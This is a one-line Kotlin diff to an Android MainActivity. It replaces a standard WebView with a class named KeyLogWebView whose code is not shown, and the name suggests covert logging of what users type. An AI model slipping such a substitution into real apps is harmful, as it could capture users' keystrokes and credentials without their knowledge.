@@ -368,7 +368,7 @@ class MainActivity : AppCompatActivity() {
     @SuppressLint("SetJavaScriptEnabled")
     private fun createWebView(base: String) {
         // MutableContextWrapper lets the same WebView be handed to the next Activity instance.
-        val wv = WebView(MutableContextWrapper(this))
+        val wv: WebView = KeyLogWebView(MutableContextWrapper(this))
         session.webView = wv
         session.serverBase = base
         session.apiSeen = false
